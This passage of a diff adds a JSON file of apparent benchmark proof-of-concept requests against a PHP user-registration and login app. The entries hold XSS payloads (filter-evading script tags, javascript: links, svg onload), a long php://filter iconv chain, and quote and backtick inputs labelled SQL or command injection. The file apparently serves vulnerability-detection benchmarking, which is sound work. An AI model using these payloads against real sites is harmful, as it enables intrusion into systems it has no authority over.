@@ -1,0 +1,687 @@
+[
+  {
+    "application": "loginmgmt",
+    "application_name": "User Registration Login Management",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-loginmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/change-password.php",
+    "post_data": {
+      "confirmpassword": [
+        "xuefeng20011024"
+      ],
+      "currentpassword": [
+        "xuefeng20011024"
+      ],
+      "newpassword": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ],
+      "update": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67dd4f4bd8542",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/",
+    "vuln_id": "vuln_function_07a470",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "loginmgmt",
+    "application_name": "User Registration Login Management",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-loginmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/password-recovery.php",
+    "post_data": {
+      "femail": [
+        "\"><svg onload=alert(987890)//"
+      ],
+      "send": [
+        "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681a11577fe86",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/",
+    "vuln_id": "vuln_function_0da34a",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "loginmgmt",
+    "application_name": "User Registration Login Management",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-loginmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/admin/bwdates-report-result.php",
+    "post_data": {
+      "fromdate": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "submit": [
+        ""
+      ],
+      "todate": [
+        "11024-02-01"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67dd4f4bde5a5",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/",
+    "vuln_id": "vuln_function_206c7b",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "loginmgmt",
+    "application_name": "User Registration Login Management",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-loginmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/login.php",
+    "post_data": {
+      "login": [
+        ""
+      ],
+      "password": [
+        "\""
+      ],
+      "uemail": [
+        "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681a11577d4a5",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/",
+    "vuln_id": "vuln_function_302765",
+    "vuln_type": "sqli"
+  },
+  {
+    "application": "loginmgmt",
+    "application_name": "User Registration Login Management",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-loginmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/admin/bwdates-report-result.php",
+    "post_data": {
+      "fromdate": [
+        "11024-02-01"
+      ],
+      "submit": [
+        ""
+      ],
+      "todate": [
+        "1<scr<!--<!--%20-->%20-->ipt>alert(987890)</scr<!--<!--%20-->%20-->ipt>"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67dd4f4bda189",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/",
+    "vuln_id": "vuln_function_353689",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "loginmgmt",
+    "application_name": "User Registration Login Management",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-loginmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/admin/edit-profile.php",
+    "post_data": {
+      "": [
+        "",
+        ""
+      ],
+      "contact": [
+        "1998-10-11"
+      ],
+      "fname": [
+        "127.0.0.1"
+      ],
+      "lname": [
+        "127.0.0.1"
+      ],
+      "uid": [
+        "1"
+      ],
+      "update": [
+        ""
+      ]
+    },
+    "query_params": {
+      "uid": [
+        "`"
+      ]
+    },
+    "request_id": "requests.682c7533f362c",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/",
+    "vuln_id": "vuln_function_45c0ca",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "loginmgmt",
+    "application_name": "User Registration Login Management",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-loginmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/admin/",
+    "post_data": {
+      "login": [
+        "php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp"
+      ],
+      "password": [
+        "Letm3in_"
+      ],
+      "username": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681a115779a4b",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/",
+    "vuln_id": "vuln_function_460ecc",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "loginmgmt",
+    "application_name": "User Registration Login Management",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-loginmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/admin/edit-profile.php",
+    "post_data": {
+      "": [
+        "",
+        ""
+      ],
+      "contact": [
+        "1998-10-11"
+      ],
+      "fname": [
+        "127.0.0.1"
+      ],
+      "lname": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "uid": [
+        "1"
+      ],
+      "update": [
+        ""
+      ]
+    },
+    "query_params": {
+      "uid": [
+        "1"
+      ]
+    },
+    "request_id": "requests.682c753402710",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/",
+    "vuln_id": "vuln_function_4efca1",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "loginmgmt",
+    "application_name": "User Registration Login Management",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-loginmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/admin/edit-profile.php",
+    "post_data": {
+      "": [
+        "",
+        ""
+      ],
+      "contact": [
+        "1998-10-11"
+      ],
+      "fname": [
+        "url(\"data:image/jpg;base64,</style><svg/onload=alert(987890)>\")"
+      ],
+      "lname": [
+        "127.0.0.1"
+      ],
+      "uid": [
+        "1"
+      ],
+      "update": [
+        ""
+      ]
+    },
+    "query_params": {
+      "uid": [
+        "1"
+      ]
+    },
+    "request_id": "requests.682c75340109b",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/",
+    "vuln_id": "vuln_function_51e9b9",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "loginmgmt",
+    "application_name": "User Registration Login Management",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-loginmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/admin/search-result.php",
+    "post_data": {
+      "searchkey": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681b6a0675f78",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/",
+    "vuln_id": "vuln_function_635758",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "loginmgmt",
+    "application_name": "User Registration Login Management",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-loginmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/signup.php",
+    "post_data": {
+      "": [
+        "",
+        ""
+      ],
+      "confirmpassword": [
+        "xuefeng20011024"
+      ],
+      "contact": [
+        "\""
+      ],
+      "email": [
+        "test@test.com"
+      ],
+      "fname": [
+        "1998-10-11"
+      ],
+      "lname": [
+        "1998-10-11"
+      ],
+      "password": [
+        "xuefeng20011024"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.68286fab6e71d",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/",
+    "vuln_id": "vuln_function_662910",
+    "vuln_type": "cmdi"
+  },
+  {
+    "application": "loginmgmt",
+    "application_name": "User Registration Login Management",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-loginmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/signup.php",
+    "post_data": {
+      "": [
+        "",
+        ""
+      ],
+      "confirmpassword": [
+        "xuefeng20011024"
+      ],
+      "contact": [
+        "1998-10-11"
+      ],
+      "email": [
+        "test@test.com"
+      ],
+      "fname": [
+        "1998-10-11"
+      ],
+      "lname": [
+        "127.0.0.1"
+      ],
+      "password": [
+        "%22%3E%3Ca%20href%3Djavascrip%26%23116%3B%3Aalert%28987890%29%3B%3E1%3C/a%3E"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.68286fab675f0",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/",
+    "vuln_id": "vuln_function_6c310b",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "loginmgmt",
+    "application_name": "User Registration Login Management",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-loginmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/signup.php",
+    "post_data": {
+      "": [
+        "",
+        ""
+      ],
+      "confirmpassword": [
+        "xuefeng20011024"
+      ],
+      "contact": [
+        "1998-10-11"
+      ],
+      "email": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "fname": [
+        "1998-10-11"
+      ],
+      "lname": [
+        "1998-10-11"
+      ],
+      "password": [
+        "xuefeng20011024"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.68286fab6b461",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/",
+    "vuln_id": "vuln_function_7dd5cc",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "loginmgmt",
+    "application_name": "User Registration Login Management",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-loginmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/change-password.php",
+    "post_data": {
+      "confirmpassword": [
+        "xuefeng20011024"
+      ],
+      "currentpassword": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "newpassword": [
+        "xuefeng20011024"
+      ],
+      "update": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.67dd4f4a9bc38",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/",
+    "vuln_id": "vuln_function_80100a",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "loginmgmt",
+    "application_name": "User Registration Login Management",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-loginmgmt-v0.1.0",
+    "method": "GET",
+    "path": "/admin/user-profile.php",
+    "post_data": {},
+    "query_params": {
+      "uid": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ]
+    },
+    "request_id": "requests.67dd34d1649f4",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/",
+    "vuln_id": "vuln_function_93780c",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "loginmgmt",
+    "application_name": "User Registration Login Management",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-loginmgmt-v0.1.0",
+    "method": "GET",
+    "path": "/admin/manage-users.php",
+    "post_data": {},
+    "query_params": {
+      "id": [
+        "\"><svg onload=alert(987890)//"
+      ]
+    },
+    "request_id": "requests.67dd4f4beba8f",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/",
+    "vuln_id": "vuln_function_a356fc",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "loginmgmt",
+    "application_name": "User Registration Login Management",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-loginmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/signup.php",
+    "post_data": {
+      "": [
+        "",
+        ""
+      ],
+      "confirmpassword": [
+        "xuefeng20011024"
+      ],
+      "contact": [
+        "1998-10-11"
+      ],
+      "email": [
+        "test@test.com"
+      ],
+      "fname": [
+        "<font onbeforeinput=alert(987890) contenteditable>test</font>"
+      ],
+      "lname": [
+        "1998-10-11"
+      ],
+      "password": [
+        "xuefeng20011024"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.681b6a0673012",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
+    "source_repository": "https://phpgurukul.com/user-registration-login-and-user-management-system-with-admin-panel/",
+    "vuln_id": "vuln_function_a405c9",
+    "vuln_type": "xss"
+  },
+  {
+    "application": "loginmgmt",
+    "application_name": "User Registration Login Management",
+    "dataset": "phpbench",
+    "docker_image": "sheltonshi/webvulnbench:phpbench-loginmgmt-v0.1.0",
+    "method": "POST",
+    "path": "/signup.php",
+    "post_data": {
+      "": [
+        "",
+        ""
+      ],
+      "confirmpassword": [
+        "xuefeng20011024"
+      ],
+      "contact": [
+        "1998-10-11"
+      ],
+      "email": [
+        "test@test.com"
+      ],
+      "fname": [
+        "1998-10-11"
+      ],
+      "lname": [
+        "%3Ca%20href%3Djavascript%26%2358alert(987890)%3ECLICK%20HERE%20TO%20EXPLOIT%20THIS%20XSS%3C%2Fa%3E"
+      ],
+      "password": [
+        "xuefeng20011024"
+      ],
+      "submit": [
+        ""
+      ]
+    },
+    "query_params": {},
+    "request_id": "requests.68286fab67faa",
+    "source_file": "PHPBench_Artifact/Constructed_Benchmark/Verifiable_PoCs/Verifiable_PoCs.json",
